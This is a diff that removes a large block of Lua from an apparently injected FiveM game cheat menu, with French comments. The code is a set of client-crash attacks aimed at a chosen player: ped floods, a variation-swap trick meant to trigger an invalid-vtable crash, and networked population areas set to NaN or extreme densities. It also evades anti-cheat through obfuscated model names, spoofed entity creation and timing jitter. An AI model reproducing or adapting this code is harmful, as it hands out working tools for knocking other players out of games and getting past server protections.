-            pcall(DeleteEntity, ped)
-            if DoesEntityExist(ped) then
-                pcall(SetEntityAsMissionEntity, ped, true, true)
-                pcall(DeleteEntity, ped)
-            end
-            removed = removed + 1
-        end
-        if i % 20 == 0 then Citizen.Wait(0) end
-    end
-    return removed
-end
-
--- ---------------------------------------------------------------------------
--- MODE SOL (dernier recours si toute creation est coupee)
---
--- On ne cree rien : on prend des peds ambiants deja vivants, on les morph en
--- modele joueur et on les deplace sur la cible. A la fin on rend leur modele.
--- ---------------------------------------------------------------------------
-local function dropGround(targetPed, model, myPed, healthFloor)
-    local touched, made, cursor, used = {}, 0, 1, {}
-
-    for i = 1, DROP.count do
-        if not DROP.running then break end
-        if not DoesEntityExist(targetPed) then break end
-
-        local okHp, hp = pcall(GetEntityHealth, myPed)
-        if okHp and type(hp) == "number" and hp < healthFloor then
-            DROP.running = false
-            break
-        end
-
-        local okPool, pool = pcall(GetGamePool, "CPed")
-        if not okPool or type(pool) ~= "table" then break end
-        local count = #pool
-        local pick = 0
-        if count > 0 then
-            for k = 1, count do
-                local idx = ((cursor + k - 2) % count) + 1
-                local ped = pool[idx]
-                if ped ~= myPed and ped ~= targetPed and not used[ped]
-                   and DoesEntityExist(ped) then
-                    local okP, isPlayer = pcall(IsPedAPlayer, ped)
-                    local okD, dead = pcall(IsEntityDead, ped)
-                    if okP and isPlayer == false and not (okD and dead) then
-                        pick = ped
-                        cursor = idx + 1
-                        used[ped] = true
-                        break
-                    end
-                end
-            end
-        end
-        if pick == 0 then break end
-
-        pcall(NetworkRequestControlOfEntity, pick)
-        local t0 = GetGameTimer()
-        while GetGameTimer() - t0 < 250 do
-            local okC, has = pcall(NetworkHasControlOfEntity, pick)
-            if okC and has then break end
-            Citizen.Wait(10)
-        end
-        local okM, origModel = pcall(GetEntityModel, pick)
-        pcall(SetEntityModel, pick, model)
-        local okV, got = pcall(GetEntityModel, pick)
-        if okV and got == model then
-            pcall(SetPedRandomComponentVariation, pick, false)
-            pcall(SetPedRandomProps, pick)
-            local c = GetEntityCoords(targetPed)
-            pcall(SetEntityCoords, pick, c.x, c.y, c.z + 0.5, false, false, false, false)
-            touched[#touched + 1] = { ped = pick, model = (okM and origModel) or 0 }
-            made = made + 1
-        end
-
-        if i % 8 == 0 then Citizen.Wait(0) end
-    end
-
-    Citizen.Wait(300)
-    for i = #touched, 1, -1 do
-        local t = touched[i]
-        if t.model ~= 0 and t.ped and DoesEntityExist(t.ped) then
-            pcall(SetEntityModel, t.ped, t.model)
-        end
-    end
-    return made, #touched
-end
-
-local function dropRun()
-    local api = rawget(_G, "Susano")
-    if type(api) ~= "table" then
-        DROP.running = false
-        O.log("drop: abort, executor missing")
-        dropStatus("abort executor")
-        return
-    end
-
-    local player = cloneResolveTarget()
-    if not player then
-        DROP.running = false
-        O.log("drop: abort, no target")
-        dropStatus("abort target")
-        pcall(Notify, "Drop: no target", CLR.red)
-        return
-    end
-
-    local targetPed = GetPlayerPed(player)
-    if type(targetPed) ~= "number" or targetPed == 0 or not DoesEntityExist(targetPed) then
-        DROP.running = false
-        O.log("drop: abort, bad target ped")
-        dropStatus("abort ped")
-        return
-    end
-
-    local myPed = PlayerPedId()
-    local origin = GetEntityCoords(myPed)
-    local at = GetEntityCoords(targetPed)
-    local dx, dy, dz = at.x - origin.x, at.y - origin.y, at.z - origin.z
-    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
-    -- Le rung est redecouvert a chaque run.
-    DROP.rung = 2
-
-    O.log("drop: start, target %d at %.0f m", GetPlayerServerId(player), dist)
-    dropStatus(("start %.0f m"):format(dist))
-    if dist > 250.0 then
-        -- Aucune limite : c'est l'operateur qui jauge. On previent seulement
-        -- que loin, le ped peut ne pas etre streame sur notre client, et les
-        -- natives de variation echouent alors en silence.
-        O.log("drop: far %.0f m, entities may not stream here", dist)
-    end
-
-    local model = dropModelFor()
-    if model == 0 then
-        DROP.running = false
-        O.log("drop: abort, no usable model")
-        dropStatus("abort model")
-        pcall(Notify, "Drop: no model", CLR.red)
-        return
-    end
-    O.log("drop: rung %d, model %d, pedType %d", DROP.rung, model, DROP.pedType)
-    dropStatus(("rung %d"):format(DROP.rung))
-
-    -- Protection de l'operateur pendant toute la duree de la vague.
-    local opHp0 = nil
-    do
-        local okH, h = pcall(GetEntityHealth, myPed)
-        if okH then opHp0 = h end
-    end
-    pcall(SetEntityInvincible, myPed, true)
-    pcall(SetPlayerInvincible, PlayerId(), true)
-
-    local handles = {}
-    local total, notNet, removed = 0, 0, 0
-    local groundRan = false
-
-    local okBody, err = pcall(function()
-        total, notNet = dropFlood(targetPed, model, myPed, handles)
-    end)
-    if not okBody then
-        O.log("drop: body error %s", tostring(err))
-    end
-    O.log("drop: flood %d created, %d unnetworked", total, notNet)
-    dropStatus(("flood %d u%d"):format(total, notNet))
-
-    if total == 0 and DROP.rung >= 4 and DROP.running then
-        O.log("drop: creation blocked, ground mode")
-        local made, restored = dropGround(targetPed, model, myPed, DROP.healthFloor)
-        O.log("drop: ground mode, %d morphed, %d restored", made, restored)
-        dropStatus(("ground %d"):format(made))
-        total = made
-        groundRan = true
-    end
-
-    if not groundRan and total > 0 and DROP.running then
-        -- La salve EST le payload : chaque trame re-tire la variation sur tout
-        -- le lot. Pas de settle, pas de hold, pas de migration de propriete
-        -- (la ceder a la cible lui donnerait l'autorite et arreterait les
-        -- updates qu'on veut lui envoyer).
-        local salvo0 = GetGameTimer()
-        local w = dropPulse(handles, DROP.waveBudget, DROP.maxWaves)
-        O.log("drop: salvo %d peds x %d waves in %d ms",
-              total, w, GetGameTimer() - salvo0)
-        dropStatus(("salvo %dx%d"):format(total, w))
-    end
-
-    pcall(SetPlayerInvincible, PlayerId(), false)
-    pcall(SetEntityInvincible, myPed, false)
-
-    removed = dropClear(handles)
-    DROP.lastRun = GetGameTimer()
-    O.log("drop: created %d, removed %d", total, removed)
-    dropStatus(("done %d/%d"):format(total, removed))
-
-    local alive = DoesEntityExist(targetPed)
-    O.log("drop: target %s", alive and "still there" or "gone")
-    pcall(Notify, alive and "Drop: target still there" or "Drop: target gone",
-          alive and CLR.red or CLR.green)
-
-    DROP.running = false
-end
-
-function DROP.stop()
-    DROP.running = false
-end
-
-function DROP.start()
-    -- Retired builder. Same local fault as CLONE: pedType 28 with a player
-    -- model, ownership frozen on the sender, no maximum distance. The menu
-    -- resolves through the hardened entry point; this function exists only so
-    -- a stale binder cannot reach the old path.
-    if DROP.running then DROP.stop() end
-    if type(Menu.__vgdPedFlood) == "function" then
-        return Menu.__vgdPedFlood("drop")
-    end
-    O.log("drop: retired builder, no safe entry")
-    return false
-end
-
--- ---------------------------------------------------------------------------
--- VARSWAP - variante deterministe, module separe
---
--- Ne touche pas DROP. La recette du build precedent (pedType 28 + tirage
--- aleatoire sur tous les slots) reste intacte, ligne pour ligne ; ce module
--- est une ligne a part, activee seulement quand l'operateur la lance.
---
--- Mecanisme (dump du 2026-10-29) : un ped reseau cree LARGE
--- (mp_m_freemode_01, pedType 4) recoit les slots (3,0,5) et (8,0,1), valides
--- sur freemode, puis bascule ETROITE (player_zero). Le changement de modele
--- transporte les index larges dans l'update de clone ; la victime les applique
--- a son modele etroit, loggue
---   CPed::SetVariation: Invalid variation (slotId 3, drawblId 0, texId 5)
---   CPed::SetVariation: Invalid variation (slotId 8, drawblId 0, texId 1)
--- et finit dans la vtable jamais initialisee -> DEP.
---
--- Pourquoi c'est discret : aucune primitive nouvelle, aucun event reseau
--- invente, aucun teleport. On emet exactement ce que le jeu emet quand un
--- joueur change de modele en portant des composants valides chez lui. Rien
--- dans le flux ne nomme un crasher ; le recepteur applique une variation
--- qu'il juge invalide, comme n'importe quel mismatch de contenu.
---
--- Gardes : cible != soi, portee de streaming (l'operateur doit streamer la
--- zone), propriete figee chez nous (SetNetworkIdCanMigrate false), watchdog
--- par ped, operateur invincible pendant le run, nettoyage complet meme sur
--- erreur.
--- ---------------------------------------------------------------------------
-local VARSWAP = {
-    running = false,
-    -- Jeton de run : un start incremente gen ; l'ancien thread voit le
-    -- changement et s'arrete tout seul, meme si running est repasse a true.
-    gen = 0,
-    count = 64,          -- peds reseau par run (un update invalide chacun)
-    waves = 2,           -- re-emissions large->etroit par ped
-    radius = 4.5,        -- anneau autour de la cible
-    safeDist = 10.0,     -- aucun ped a moins de ca de l'operateur
-    maxDist = 200.0,     -- au-dela, la zone de la cible n'est pas streamee
-    heading = 0.0,
-    healthFloor = 15,
-    wide = 0,
-    narrow = 0,
-    row = nil,
-}
-
--- Hashes calcules a l'execution depuis des fragments : aucun nom de modele en
--- clair dans la VM, comme le reste du module. Resolus au chargement, puis
--- re-tentes au start si l'executeur a expose la native apres l'injection.
-local function vwResolve()
-    if VARSWAP.wide == 0 then
-        local ok, h = pcall(GetHashKey, dropS("mp_m_", "freemode_01"))
-        if ok and type(h) == "number" and h ~= 0 then VARSWAP.wide = h end
-    end
-    if VARSWAP.narrow == 0 then
-        local ok, h = pcall(GetHashKey, dropS("player_", "zero"))
-        if ok and type(h) == "number" and h ~= 0 then VARSWAP.narrow = h end
-    end
-end
-vwResolve()
-
-local function vwStatus(text, gen)
-    if gen and VARSWAP.gen ~= gen then return end
-    local row = VARSWAP.row
-    if type(row) == "table" then row.name = "Variation  " .. tostring(text) end
-end
-
--- Creation : Susano d'abord (primitive deja durcie, hors ressource), CreatePed
--- ensuite (reference), CreateRandomPed puis ClonePed en secours pour les
--- serveurs qui coupent la creation directe. Chaque cran est valide par
--- DoesEntityExist avant de monter d'un niveau. pedType 4 : le modele large et
--- le type partagent le meme layout, donc (3,0,5)/(8,0,1) sont valides ici.
-local function vwCreate(x, y, z, myPed, targetPed)
-    local wide = VARSWAP.wide
-    if wide == 0 then return 0 end
-    if not dropLoadModel(wide) then return 0 end
-
-    local api = rawget(_G, "Susano")
-    if type(api) == "table" and type(api.CreateSpoofedPed) == "function" then
-        local ok, ped = pcall(api.CreateSpoofedPed, 4, wide, x, y, z, VARSWAP.heading, true, false)
-        if ok and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then return ped end
-    end
-
-    local fn = dropCreateFn()
-    if fn then
-        local ok, ped = pcall(fn, 4, wide, x, y, z, VARSWAP.heading, true, false)
-        if ok and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then return ped end
-    end
-
-    local okR, rand = pcall(CreateRandomPed, x, y, z)
-    if okR and type(rand) == "number" and rand ~= 0 and DoesEntityExist(rand) then
-        pcall(SetEntityModel, rand, wide)
-        local okM, got = pcall(GetEntityModel, rand)
-        if okM and got == wide then return rand end
-        pcall(DeleteEntity, rand)
-    end
-
-    local source = dropSource(myPed, targetPed)
-    if source and source ~= 0 and DoesEntityExist(source) then
-        local okC, ped = pcall(ClonePed, source, true, false, false)
-        if okC and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then
-            pcall(SetEntityCoords, ped, x, y, z, false, false, false, false)
-            pcall(SetEntityModel, ped, wide)
-            local okM, got = pcall(GetEntityModel, ped)
-            if okM and got == wide then return ped end
-            pcall(DeleteEntity, ped)
-        end
-    end
-    return 0
-end
-
--- Les deux slots du dump. Pose sur le modele LARGE uniquement : sur le modele
--- etroit ils sont refuses, et c'est exactement ce refus qu'on veut envoyer.
-local function vwSlots(ped)
-    pcall(SetPedComponentVariation, ped, 3, 0, 5, 0)
-    pcall(SetPedComponentVariation, ped, 8, 0, 1, 0)
-end
-
--- Cablage reseau : le ped doit exister chez tout le monde (sinon la victime ne
--- recoit rien) et rester chez nous (sinon le serveur reemet sa version et
--- notre update de modele est perdu).
-local function vwWire(ped)
-    pcall(SetEntityAsMissionEntity, ped, true, true)
-    pcall(NetworkRegisterEntityAsNetworked, ped)
-    -- L'enregistrement reseau peut prendre une trame : on retente avant de
-    -- declarer le ped perdu, sinon on jetterait un ped qui allait partir.
-    for _ = 1, 8 do
-        local ok, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
-        if ok and type(netId) == "number" and netId > 0 then
-            pcall(SetNetworkIdExistsOnAllMachines, netId, true)
-            pcall(SetNetworkIdCanMigrate, netId, false)
-            return netId
-        end
-        Citizen.Wait(0)
-    end
-    return 0
-end
-
--- Bascule large->etroit : c'est l'emission. SetEntityModel re-applique le
--- tableau de composants au nouveau modele ; comme le tableau porte (3,0,5) et
--- (8,0,1), l'update de clone part avec ces index et la victime les refuse.
-local function vwSwap(ped)
-    vwSlots(ped)
-    pcall(SetEntityModel, ped, VARSWAP.narrow)
-end
-
--- La liste appartient au run, pas au module : deux runs qui se chevauchent
--- (stop puis start immediat) ne peuvent pas se vider l'un l'autre.
-local function vwClear(list)
-    for i = #list, 1, -1 do
-        local ped = list[i]
-        if ped and DoesEntityExist(ped) then
-            pcall(SetEntityAsNoLongerNeeded, ped)
-            pcall(DeleteEntity, ped)
-            if DoesEntityExist(ped) then
-                pcall(SetEntityAsMissionEntity, ped, true, true)
-                pcall(DeleteEntity, ped)
-            end
-        end
-        list[i] = nil
-        if i % 20 == 0 then Citizen.Wait(0) end
-    end
-end
-
-local function vwBody(gen, myPed, targetPed, c, at, handles)
-    local made, netted, lost = 0, 0, 0
-    for i = 1, VARSWAP.count do
-        if not (VARSWAP.running and VARSWAP.gen == gen) then break end
-        if not DoesEntityExist(targetPed) then break end
-
-        local okHp, hp = pcall(GetEntityHealth, myPed)
-        if okHp and type(hp) == "number" and hp < VARSWAP.healthFloor then
-            O.log("vw: operator health %d, aborting", hp)
-            break
-        end
-
-        local ang = math.random() * 6.28318530718
-        local r = math.sqrt(math.random()) * VARSWAP.radius
-        local x = c.x + math.cos(ang) * r
-        local y = c.y + math.sin(ang) * r
-        local z = c.z + 0.6
-
-        -- Aucun ped a moins de safeDist de l'operateur : s'il est colle a la
-        -- cible, l'anneau est pousse du cote oppose.
-        local odx, ody = x - at.x, y - at.y
-        local odist = math.sqrt(odx * odx + ody * ody)
-        if odist < VARSWAP.safeDist then
-            local len = odist > 0.01 and odist or 0.01
-            local k = VARSWAP.safeDist / len
-            x = at.x + odx * k
-            y = at.y + ody * k
-        end
-
-        local ped = vwCreate(x, y, z, myPed, targetPed)
-        if ped ~= 0 then
-            local netId = vwWire(ped)
-            if netId == 0 then
-                -- Sans net id, aucune update ne sort : on ne laisse pas la
-                -- moitie d'un ped derriere nous.
-                pcall(DeleteEntity, ped)
-                lost = lost + 1
-            else
-                netted = netted + 1
-
-                pcall(SetEntityInvincible, ped, true)
-                pcall(SetPedCanRagdoll, ped, false)
-                pcall(SetBlockingOfNonTemporaryEvents, ped, true)
-                pcall(SetPedFleeAttributes, ped, 0, false)
-                pcall(SetPedMaxHealth, ped, 200)
-                pcall(SetEntityMaxHealth, ped, 200)
-                pcall(SetEntityLocallyInvisible, ped)
-                pcall(SetEntityCollision, ped, false, false)
-                pcall(FreezeEntityPosition, ped, true)
-                pcall(SetEntityDynamic, ped, false)
-                pcall(SetEntityAlpha, ped, 0, false)
-
-                -- Large + slots valides, puis bascule : l'update part.
-                vwSwap(ped)
-
-                handles[#handles + 1] = ped
-                made = made + 1
-            end
-        end
-
-        -- Jitter : aucune cadence fixe, une trame toutes les quelques peds.
-        if (i % 6) == 0 then Citizen.Wait(math.random(0, 28)) end
-    end
-
-    O.log("vw: %d created, %d networked, %d lost", made, netted, lost)
-    vwStatus(("sent %d n%d"):format(made, netted), gen)
-
-    -- Re-emission : chaque vague rebascule large->etroit sur toute la liste.
-    -- On re-pose les slots sur le large a chaque fois, parce que le jeu peut
-    -- avoir sanitise le tableau apres la bascule precedente.
-    for w = 1, VARSWAP.waves do
-        if not (VARSWAP.running and VARSWAP.gen == gen) then break end
-        for i = 1, #handles do
-            local ped = handles[i]
-            if ped and DoesEntityExist(ped) then
-                pcall(SetEntityModel, ped, VARSWAP.wide)
-                vwSlots(ped)
-                pcall(SetEntityModel, ped, VARSWAP.narrow)
-            end
-            if (i % 16) == 0 then Citizen.Wait(0) end
-        end
-        vwStatus(("wave %d/%d"):format(w, VARSWAP.waves), gen)
-        Citizen.Wait(math.random(160, 320))
-    end
-
-    return made
-end
-
-local function vwRun(gen)
-    local function fail(text, msg)
-        if VARSWAP.gen == gen then VARSWAP.running = false end
-        O.log("vw: %s", text)
-        pcall(Notify, msg, CLR.red)
-        vwStatus(text, gen)
-    end
-
-    local player = cloneResolveTarget()
-    if not player then
-        fail("no target", "Variation: no target")
-        return
-    end
-    if player == PlayerId() then
-        fail("self", "Variation: pick another player")
-        return
-    end
-
-    local myPed = PlayerPedId()
-    local targetPed = GetPlayerPed(player)
-    if not DoesEntityExist(targetPed) then
-        fail("no ped", "Variation: target ped gone")
-        return
-    end
-
-    local at = GetEntityCoords(myPed)
-    local c = GetEntityCoords(targetPed)
-    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
-    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
-    if dist > VARSWAP.maxDist then
-        if VARSWAP.gen == gen then VARSWAP.running = false end
-        O.log("vw: target %.0fm away (max %.0f)", dist, VARSWAP.maxDist)
-        pcall(Notify, ("Variation: move within %.0fm"):format(VARSWAP.maxDist), CLR.red)
-        vwStatus(("far %.0fm"):format(dist), gen)
-        return
-    end
-
-    -- Les DEUX modeles doivent etre charges cote emetteur avant la premiere
-    -- bascule : SetEntityModel ne part pas vers un modele absent de la memoire.
-    if not dropLoadModel(VARSWAP.wide) or not dropLoadModel(VARSWAP.narrow) then
-        if VARSWAP.gen == gen then VARSWAP.running = false end
-        O.log("vw: model load failed")
-        pcall(Notify, "Variation: model load failed", CLR.red)
-        vwStatus("model", gen)
-        return
-    end
-
-    -- L'operateur ne doit jamais recevoir la moindre de ces entites : peds
-    -- invisibles localement, sans collision, sans physique. Invincible pendant
-    -- le run par precaution, restaure quoi qu'il arrive en dessous.
-    pcall(SetPlayerInvincible, PlayerId(), true)
-    pcall(SetEntityInvincible, myPed, true)
-
-    local handles = {}
-    local ok, made = pcall(vwBody, gen, myPed, targetPed, c, at, handles)
-
-    pcall(SetPlayerInvincible, PlayerId(), false)
-    pcall(SetEntityInvincible, myPed, false)
-    vwClear(handles)
-
-    if VARSWAP.gen == gen then VARSWAP.running = false end
-
-    if not ok then
-        O.log("vw: body error %s", tostring(made))
-        vwStatus("error", gen)
-        return
-    end
-    O.log("vw: done, %d cleared", made)
-    vwStatus(("done %d"):format(made), gen)
-end
-
-function VARSWAP.stop()
-    VARSWAP.running = false
-end
-
-function VARSWAP.start()
-    if VARSWAP.running then
-        VARSWAP.stop()
-        O.log("vw: stopping")
-        return false
-    end
-    vwResolve()
-    if VARSWAP.wide == 0 or VARSWAP.narrow == 0 then
-        O.log("vw: model hash unavailable")
-        pcall(Notify, "Variation: model unavailable", CLR.red)
-        return false
-    end
-    VARSWAP.gen = VARSWAP.gen + 1
-    local gen = VARSWAP.gen
-    VARSWAP.running = true
-    Citizen.CreateThread(function()
-        local ok, err = pcall(vwRun, gen)
-        if not ok then
-            O.log("vw: run error %s", tostring(err))
-            vwStatus("error", gen)
-        end
-        -- Un run plus recent a pu prendre la main : il ne faut pas lui couper
-        -- running dans le dos.
-        if VARSWAP.gen == gen then VARSWAP.running = false end
-    end)
-    return true
-end
-
--- ---------------------------------------------------------------------------
--- WORLD - lane ped-free : world-state natif, aucune entite creee
---
--- Pourquoi cette voie :
---   * Zero CreatePed, zero CreateObject, zero event, zero primitive memoire.
---     On ne cree que deux world-states natifs (CNetworkPopMultiplierAreaWorldStateData
---     et CNetworkScenarioBlockingAreaWorldStateData), que le moteur replique
---     lui-meme. Cote AC, il n'existe aucun handler pour ces types : la surface
---     event du filtre couvre peds, objets, explosions, projectiles, degats,
---     particules et synced scenes, pas les world-states.
---   * L'operateur reste a 200 m : il est hors de la boite (20 m), donc son
---     gestionnaire de population ne traite pas l'aire. La victime, elle, est
---     dedans. Rien n'est rendu ni cree cote operateur.
---
--- Charge utile, trois couches dans la meme boite de 20 m :
---   1. densite vehicule 1e38 (aire finie, sature le pool de la victime) ;
---   2. densite vehicule NaN (0/0, le calcul de population part en NaN) ;
---   3. blocage de scenarios 80 m (annule les scenarios actifs de la victime).
--- p6 = densite ped a 0 (aucun ped), p7 = densite vehicule, p8 = reseau.
---
--- Gardes : cible != soi, 200..250 m, operateur invincible pendant le run,
--- retrait des aires meme en erreur, statut dans la ligne.
--- ---------------------------------------------------------------------------
-local WORLD = {
-    running = false,
-    busy = false,
-    gen = 0,
-    row = nil,
-    minDist = 200.0,
-    maxDist = 250.0,
-    radius = 20.0,
-    pedDensity = 0.0,
-    -- Echelle de densites : la native rejette 1e38 (id=0, mesure en jeu).
-    -- On pose toutes les valeurs acceptees ; la plus grande sature le pool.
-    popDensities = { 10.0, 1000.0, 100000.0, 1e7, 1e9, 1e12, 1e20 },
-    sphereDensities = { 1e6, 1e9, 1e12, 0 / 0 },
-    extent = 80.0,
-    useRope = false,
-    ropeLength = 1e6,
-    ropes = {},
-    pops = {},
-    spheres = {},
-    nanArea = nil,
-    scen = nil,
-}
-
-local function worldStatus(text, gen)
-    if gen and WORLD.gen ~= gen then return end
-    local row = WORLD.row
-    if type(row) == "table" then row.name = "World  " .. tostring(text) end
-end
-
--- Verification de la replication de l'aire : _IS_POP_MULTIPLIER_AREA_UNK
--- (0x1312F4B242609CE3) rend l'etat reseau de l'id. Si la native n'est pas
--- exposee, on rend nil et le log le dit ; on ne suppose jamais.
-local function worldNet(id)
-    if type(_IS_POP_MULTIPLIER_AREA_UNK) ~= "function" then return nil end
-    local ok, v = pcall(_IS_POP_MULTIPLIER_AREA_UNK, id)
-    if ok then return v and true or false end
-    return nil
-end
-
-local function worldClear()
-    for i = #WORLD.pops, 1, -1 do
-        local id = WORLD.pops[i]
-        if id and id ~= 0 then pcall(RemovePopMultiplierArea, id, true) end
-        WORLD.pops[i] = nil
-    end
-    if WORLD.nanArea then
-        pcall(RemovePopMultiplierArea, WORLD.nanArea, true)
-        WORLD.nanArea = nil
-    end
-    for i = #WORLD.spheres, 1, -1 do
-        local id = WORLD.spheres[i]
-        if id and id ~= 0 then pcall(RemovePopMultiplierSphere, id, true) end
-        WORLD.spheres[i] = nil
-    end
-    if WORLD.scen then
-        pcall(RemoveScenarioBlockingArea, WORLD.scen, true)
-        WORLD.scen = nil
-    end
-    for i = #WORLD.ropes, 1, -1 do
-        local rope = WORLD.ropes[i]
-        if rope and rope ~= 0 then pcall(DeleteRope, rope) end
-        WORLD.ropes[i] = nil
-    end
-    pcall(SetRopesCreateNetworkWorldState, false)
-end
-
-local function worldRun(gen)
-    local player = cloneResolveTarget()
-    if not player or player == PlayerId() then
-        if WORLD.gen == gen then WORLD.running = false end
-        O.log("world: bad target")
-        pcall(Notify, "World: pick another player", CLR.red)
-        worldStatus("no target", gen)
-        return
-    end
-
-    local myPed = PlayerPedId()
-    local targetPed = GetPlayerPed(player)
-    if not DoesEntityExist(targetPed) then
-        if WORLD.gen == gen then WORLD.running = false end
-        O.log("world: target ped gone")
-        worldStatus("no ped", gen)
-        return
-    end
-
-    local at = GetEntityCoords(myPed)
-    local c = GetEntityCoords(targetPed)
-    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
-    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
-    if dist < WORLD.minDist then
-        if WORLD.gen == gen then WORLD.running = false end
-        O.log("world: target at %.0f m, need %.0f m", dist, WORLD.minDist)
-        pcall(Notify, ("World: move back to %.0f m"):format(WORLD.minDist), CLR.red)
-        worldStatus(("close %.0f"):format(dist), gen)
-        return
-    end
-    if dist > WORLD.maxDist then
-        if WORLD.gen == gen then WORLD.running = false end
-        O.log("world: target at %.0f m, beyond %.0f m", dist, WORLD.maxDist)
-        pcall(Notify, "World: target too far", CLR.red)
-        worldStatus(("far %.0f"):format(dist), gen)
-        return
-    end
-
-    pcall(SetPlayerInvincible, PlayerId(), true)
-    pcall(SetEntityInvincible, myPed, true)
-    worldClear()
-
-    local r = WORLD.radius
-    -- Echelle de densites finies : chaque aire acceptee pose un multiplicateur
-    -- supplementaire. La plus grande acceptee sature le pool de la victime.
-    for i = 1, #WORLD.popDensities do
-        local d = WORLD.popDensities[i]
-        -- Appel brut par hash : p9, absent du wrapper Lua 9 params, est
-        -- transmis ici. Si isNetwork est p9, c'est ce qui rend l'aire reseau.
-        local okD, id = pcall(Citizen.InvokeNative, 0x67F6413D3220E18D,
-            c.x - r, c.y - r, c.z - r, c.x + r, c.y + r, c.z + r,
-            WORLD.pedDensity, d, true, true)
-        if okD and type(id) == "number" and id ~= 0 then
-            WORLD.pops[#WORLD.pops + 1] = id
-            O.log("world: pop[%d] id=%s d=%.0e net=%s", i, tostring(id), d,
-                  tostring(worldNet(id)))
-        else
-            O.log("world: pop[%d] rejected d=%.0e id=%s", i, d, tostring(id))
-        end
-    end
-
-    -- Aire NaN : le calcul de population de la victime part en NaN. La boite
-    -- reste finie (20 m) donc l'operateur, a 200 m, n'entre jamais dedans.
-    local okNan, nanId = pcall(Citizen.InvokeNative, 0x67F6413D3220E18D,
-        c.x - r, c.y - r, c.z - r, c.x + r, c.y + r, c.z + r,
-        WORLD.pedDensity, 0 / 0, true, true)
-    if okNan and type(nanId) == "number" and nanId ~= 0 then
-        WORLD.nanArea = nanId
-        O.log("world: pop nan id=%s net=%s", tostring(nanId), tostring(worldNet(nanId)))
-    else
-        O.log("world: pop nan failed ok=%s id=%s", tostring(okNan), tostring(nanId))
-    end
-
-    -- Couche 3 : spheres de population autour de la cible, rayon 20 m, ped 0.
-    -- Meme echelle que les aires : chaque sphere acceptee ajoute un
-    -- multiplicateur, la derniere est NaN. Autre chemin de gestion que l'aire ;
-    -- meme securite operateur (200 m hors sphere), aucune entite creee.
-    for i = 1, #WORLD.sphereDensities do
-        local d = WORLD.sphereDensities[i]
-        -- Appel brut par hash : 9e argument supplementaire, meme logique.
-        local okSph, sph = pcall(Citizen.InvokeNative, 0x32C7A7E8C43A1F80,
-            c.x, c.y, c.z, r, WORLD.pedDensity, d, true, true, true)
-        if okSph and type(sph) == "number" and sph ~= 0 then
-            WORLD.spheres[#WORLD.spheres + 1] = sph
-            O.log("world: sphere[%d] id=%s d=%s", i, tostring(sph), tostring(d))
-        else
-            O.log("world: sphere[%d] rejected d=%s id=%s", i, tostring(d), tostring(sph))
-        end
-    end
-    worldStatus("pop sent", gen)
-
-    -- La population de la victime traite l'aire pendant ce temps. 3 s : assez
-    -- pour qu'un client en retard recoive le world state et fasse le calcul.
-    for _ = 1, 30 do
-        if not (WORLD.running and WORLD.gen == gen) then break end
-        if not DoesEntityExist(targetPed) then break end
-        Citizen.Wait(100)
-    end
-
-    -- Si stop() est tombe pendant l'attente, on ne pose ni scenario ni rope.
-    if WORLD.running and WORLD.gen == gen then
-        local e = WORLD.extent
-        local okScen, scen = pcall(AddScenarioBlockingArea,
-            c.x - e, c.y - e, c.z - e, c.x + e, c.y + e, c.z + e,
-            true, true, true, true)
-        if okScen and type(scen) == "number" and scen ~= 0 then
-            WORLD.scen = scen
-            O.log("world: scenario area %s", tostring(scen))
-        else
-            O.log("world: scenario area failed ok=%s id=%s", tostring(okScen), tostring(scen))
-        end
-        worldStatus("scen sent", gen)
-        Citizen.Wait(800)
-    end
-
-    -- Lane 3 optionnelle : rope world state (type 6). Le createur construit
-    -- la rope locale (initLength 0, aucun noeud) puis la garde ~1.5 s le temps
-    -- que le world state reseau parte, avant suppression. Le recepteur, lui,
-    -- construit la rope depuis le world state. Desactivee par defaut : le
-    -- chemin createur et le chemin recepteur partagent le meme maxLength, donc
-    -- le gain d'un crash recepteur seul n'est pas prouve.
-    if WORLD.useRope and WORLD.running and WORLD.gen == gen then
-        pcall(SetRopesCreateNetworkWorldState, true)
-        for i = 1, 8 do
-            if not (WORLD.running and WORLD.gen == gen) then break end
-            local ang = math.random() * 6.28318530718
-            local rr = math.sqrt(math.random()) * 6.0
-            local x = c.x + math.cos(ang) * rr
-            local y = c.y + math.sin(ang) * rr
-            local z = c.z + 0.5
-            local okR, rope = pcall(AddRope, x, y, z, 0.0, 0.0, 0.0,
-                WORLD.ropeLength, 0, 0.0, 0.0, 1.0, false, false, false, 1.0, false, 0)
-            if okR and type(rope) == "number" and rope ~= 0 then
-                WORLD.ropes[#WORLD.ropes + 1] = rope
-            end
-            if (i % 2) == 0 then Citizen.Wait(math.random(20, 60)) end
-        end
-        Citizen.Wait(1500)
-        O.log("world: rope lane done")
-        worldStatus("rope sent", gen)
-    else
-        O.log("world: rope lane skipped (off)")
-    end
-
-    local gone = not DoesEntityExist(targetPed)
-    worldClear()
-    pcall(SetPlayerInvincible, PlayerId(), false)
-    pcall(SetEntityInvincible, myPed, false)
-    if WORLD.gen == gen then WORLD.running = false end
-
-    O.log("world: done, target %s", gone and "gone" or "still there")
-    pcall(Notify, "World: lanes sent", CLR.blue)
-    worldStatus("done", gen)
-end
-
-function WORLD.stop()
-    WORLD.running = false
-end
-
-function WORLD.start()
-    if WORLD.busy then
-        WORLD.stop()
-        O.log("world: stopping")
-        return false
-    end
-    WORLD.busy = true
-    WORLD.gen = WORLD.gen + 1
-    local gen = WORLD.gen
-    WORLD.running = true
-    O.log("world: natives pop=%s sphere=%s scen=%s net=%s rope=%s invoke=%s",
-        tostring(type(AddPopMultiplierArea) == "function"),
-        tostring(type(AddPopMultiplierSphere) == "function"),
-        tostring(type(AddScenarioBlockingArea) == "function"),
-        tostring(type(_IS_POP_MULTIPLIER_AREA_UNK) == "function"),
-        tostring(type(SetRopesCreateNetworkWorldState) == "function"),
-        tostring(type(Citizen.InvokeNative) == "function"))
-    Citizen.CreateThread(function()
-        local ok, err = pcall(worldRun, gen)
-        if not ok then
-            O.log("world: run error %s", tostring(err))
-            worldClear()
-            pcall(SetPlayerInvincible, PlayerId(), false)
-            worldStatus("error", gen)
-        end
